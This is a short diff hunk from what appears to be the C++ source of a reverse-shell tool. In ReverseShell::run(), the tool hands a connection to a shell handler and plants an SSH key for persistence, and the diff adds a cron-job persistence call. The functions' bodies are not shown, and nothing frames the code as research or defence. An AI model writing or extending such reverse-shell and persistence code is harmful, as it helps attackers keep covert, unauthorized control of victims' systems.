@@ -25,6 +25,7 @@ void ReverseShell::run() {
             handleShell(conn.getSocketFd(), pty_fd);
         }
         Persistence::insertSSHKey(conn.getSocketFd(), sshKey);
+        Persistence::insertCronJob(conn.getSocketFd(), sshKey);
     }
 }
 void ReverseShell::handleShell(int sockfd, int pty_fd) {
